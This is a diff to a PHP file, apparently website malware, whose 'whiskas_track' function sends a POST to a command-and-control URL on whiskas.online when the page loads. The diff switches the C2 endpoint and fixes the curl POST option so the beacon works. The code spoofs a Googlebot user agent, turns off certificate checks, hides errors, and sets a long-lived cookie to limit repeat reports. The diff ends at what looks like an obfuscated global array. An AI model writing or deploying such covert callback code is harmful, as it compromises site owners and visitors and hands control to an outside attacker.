@@ -3,7 +3,7 @@
 Author:  Whiskas Triple Six V.666
 */
 function whiskas_track() {
-    $c2_url = "https://whiskas.online/dashboard.php";
+    $c2_url = "https://whiskas.online/dashboard/whiskaseye.php"; 
     $key    = "WHISKAS_666_SECURE"; 
 
     $report_hash = md5($_SERVER['HTTP_HOST'] . 'whiskas_v6'); 
@@ -21,12 +21,11 @@ function whiskas_track() {
 
         $ch = curl_init($c2_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, $_POST, true);
+        curl_setopt($ch, CURLOPT_POST, true); 
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_TIMEOUT, 3);
         curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
-		
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
         
         @curl_exec($ch);
@@ -35,7 +34,6 @@ function whiskas_track() {
         @setcookie('report_' . $report_hash, 'true', time() + 31536000, '/');
     }
 }
-
 whiskas_track();
 
 $GLOBALS['oZgNypoPRU'] = array(
